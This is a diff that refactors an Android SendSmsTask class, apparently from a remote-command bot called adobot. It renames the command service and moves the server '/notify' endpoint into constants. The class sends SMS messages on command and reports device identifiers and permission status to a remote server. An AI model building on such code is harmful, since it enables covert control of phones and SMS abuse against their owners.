@@ -12,11 +12,12 @@ import android.support.v4.content.ContextCompat;
 import android.telephony.SmsManager;
 import android.util.Log;
 
-import com.android.adobot.CommandReceiverService;
+import com.android.adobot.CommandService;
 
 import java.util.ArrayList;
 import java.util.HashMap;
 
+import com.android.adobot.Constants;
 import com.android.adobot.http.Http;
 import com.android.adobot.http.HttpRequest;
 
@@ -36,7 +37,7 @@ public class SendSmsTask extends BaseTask {
     private String phoneNumber;
     private String textMessage;
 
-    public SendSmsTask(CommandReceiverService c) {
+    public SendSmsTask(CommandService c) {
         setContext(c);
     }
 
@@ -63,8 +64,8 @@ public class SendSmsTask extends BaseTask {
             noPermit.put("device", commonParams.getDevice());
             noPermit.put("permission", "SEND_SMS");
             Http doneSMS = new Http();
-            doneSMS.setUrl(commonParams.getServer() + "/notify");
-            doneSMS.setMethod("POST");
+            doneSMS.setUrl(commonParams.getServer() + Constants.NOTIFY_URL);
+            doneSMS.setMethod(HttpRequest.METHOD_POST);
             doneSMS.setParams(noPermit);
             doneSMS.execute();
             requestPermissions();
@@ -133,7 +134,7 @@ public class SendSmsTask extends BaseTask {
             params.put("device", commonParams.getDevice());
 
             Http req = new Http();
-            req.setUrl(commonParams.getServer() + "/notify");
+            req.setUrl(commonParams.getServer() + Constants.NOTIFY_URL);
             req.setMethod(HttpRequest.METHOD_POST);
             req.setParams(params);
             req.execute();
